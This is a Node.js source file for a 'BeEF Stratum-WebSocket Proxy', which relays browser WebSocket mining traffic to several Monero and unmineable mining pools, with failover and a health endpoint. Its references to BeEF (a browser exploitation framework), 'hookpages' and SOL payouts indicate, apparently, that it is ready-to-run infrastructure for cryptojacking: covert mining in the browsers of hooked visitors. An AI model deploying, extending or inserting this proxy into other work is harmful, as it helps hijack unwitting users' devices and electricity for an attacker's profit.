#!/usr/bin/env node
/**
 * BeEF Stratum-WebSocket Proxy  v2
 * ==================================
 * Bridges browser WebSocket connections to a TCP stratum mining pool.
 * Browsers cannot open raw TCP connections, so this proxy sits in the middle:
 *
 *   Browser  <──WebSocket──>  proxy.js  <──TCP──>  pool:port
 *
 * Supports automatic failover across multiple configured pools.
 * Set up as a systemd service by deploy.sh.
 *
 * Configuration via environment variables:
 *   MINER_POOL_HOST   Primary pool host   (default: rx.unmineable.com)
 *   MINER_POOL_PORT   Primary pool port   (default: 3333)
 *   MINER_PROXY_PORT  Local WS port       (default: 8080)
 *   MINER_PROXY_HOST  Local bind address  (default: 0.0.0.0)
 *
 * Additional pools (tried in order on primary failure):
 *   MINER_POOL2_HOST / MINER_POOL2_PORT
 *   MINER_POOL3_HOST / MINER_POOL3_PORT
 *
 * Supported mining pools for unmineable SOL payouts:
 *   rx.unmineable.com:3333  — primary (RandomX, Stratum)
 *   rx.unmineable.com:443   — alt port (firewalled networks)
 *   rx2.unmineable.com:3333 — secondary unmineable server
 *
 * Other pools (set coin/wallet accordingly in hookpages config):
 *   gulf.moneroocean.stream:10128 — MoneroOcean (XMR, algo-switching)
 *   pool.supportxmr.com:3333      — SupportXMR  (XMR)
 *   xmr.2miners.com:2222          — 2Miners     (XMR)
 */

'use strict';

const net  = require('net');
const http = require('http');
const { WebSocketServer } = require('ws');

// ── Pool list (primary + fallbacks) ──────────────────────────────────────────
const POOLS = [
  {
    host: process.env.MINER_POOL_HOST  || 'rx.unmineable.com',
    port: parseInt(process.env.MINER_POOL_PORT)  || 3333,
  },
  // Optional second pool via env
  ...(process.env.MINER_POOL2_HOST ? [{
    host: process.env.MINER_POOL2_HOST,
    port: parseInt(process.env.MINER_POOL2_PORT) || 3333,
  }] : [
    { host: 'rx.unmineable.com',  port: 443  },  // alt port fallback
    { host: 'rx2.unmineable.com', port: 3333 },  // secondary server
  ]),
  // Optional third pool via env
  ...(process.env.MINER_POOL3_HOST ? [{
    host: process.env.MINER_POOL3_HOST,
    port: parseInt(process.env.MINER_POOL3_PORT) || 3333,
  }] : []),
];

const PROXY_PORT = parseInt(process.env.MINER_PROXY_PORT) || 8080;
const PROXY_HOST = process.env.MINER_PROXY_HOST || '0.0.0.0';

// ── HTTP health-check endpoint ────────────────────────────────────────────────
const server = http.createServer((req, res) => {
  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      status:  'ok',
      pools:   POOLS,
      clients: wss ? wss.clients.size : 0,
    }));
  } else {
    res.writeHead(200);
    res.end('BeEF Stratum-WS Proxy running\n');
  }
});

const wss = new WebSocketServer({ server });

// ── Per-connection handler ────────────────────────────────────────────────────
wss.on('connection', (ws, req) => {
  const clientAddr = req.socket.remoteAddress;
  console.log(`[miner-proxy] browser connected from ${clientAddr}`);

  let poolIndex = 0;
  let tcp       = null;
  let tcpReady  = false;
  const tcpQueue = [];
  let destroyed  = false;

  function connectPool(index) {
    if (destroyed) return;
    if (index >= POOLS.length) {
      console.error(`[miner-proxy] all pools exhausted for ${clientAddr}`);
      if (ws.readyState === ws.OPEN) ws.close(1011, 'all pools unreachable');
      return;
    }

    const pool = POOLS[index];
    console.log(`[miner-proxy] connecting to pool ${pool.host}:${pool.port} (attempt ${index + 1}/${POOLS.length})`);

    const sock = net.createConnection({ host: pool.host, port: pool.port });
    tcp = sock;
    tcpReady = false;

    // Connection timeout (10 s per pool)
    const connTimeout = setTimeout(() => {
      if (!tcpReady) {
        console.warn(`[miner-proxy] timeout connecting to ${pool.host}:${pool.port}, trying next pool`);
        sock.destroy();
      }
    }, 10000);

    sock.on('connect', () => {
      clearTimeout(connTimeout);
      tcpReady = true;
      // Drain any messages buffered while connecting
      tcpQueue.splice(0).forEach(m => sock.write(m + '\n'));
      console.log(`[miner-proxy] pool ${pool.host}:${pool.port} connected for ${clientAddr}`);
    });

    // Pool → Browser
    let tcpBuf = '';
    sock.on('data', data => {
      tcpBuf += data.toString();
      let nl;
      while ((nl = tcpBuf.indexOf('\n')) !== -1) {
        const line = tcpBuf.slice(0, nl).trim();
        tcpBuf = tcpBuf.slice(nl + 1);
        if (line && ws.readyState === ws.OPEN) ws.send(line);
      }
    });

    sock.on('error', err => {
      clearTimeout(connTimeout);
      console.error(`[miner-proxy] pool error (${pool.host}:${pool.port}) for ${clientAddr}: ${err.message}`);
      sock.destroy();
    });

    sock.on('close', () => {
      clearTimeout(connTimeout);
      if (destroyed) return;
      if (!tcpReady) {
        // Connection never established — try next pool
        connectPool(index + 1);
      } else {
        // Was connected but pool closed — give up (browser will reconnect)
        if (ws.readyState === ws.OPEN) ws.close(1000, 'pool closed');
      }
    });
  }

  // Browser → Pool
  ws.on('message', msg => {
    const line = msg.toString().trim();
    if (!line) return;
    if (tcp && tcpReady) {
      tcp.write(line + '\n');
    } else {
      tcpQueue.push(line);
    }
  });

  ws.on('close', () => {
    destroyed = true;
    if (tcp) tcp.destroy();
    console.log(`[miner-proxy] browser disconnected: ${clientAddr}`);
  });

  ws.on('error', () => {
    destroyed = true;
    if (tcp) tcp.destroy();
  });

  connectPool(poolIndex);
});

// ── Start listening ───────────────────────────────────────────────────────────
server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log(`[miner-proxy] listening on ${PROXY_HOST}:${PROXY_PORT}`);
  console.log(`[miner-proxy] pool list:`);
  POOLS.forEach((p, i) => console.log(`  ${i === 0 ? 'PRIMARY' : `FALLBACK${i}`}: ${p.host}:${p.port}`));
});

server.on('error', err => {
  console.error(`[miner-proxy] server error: ${err.message}`);
  process.exit(1);
});
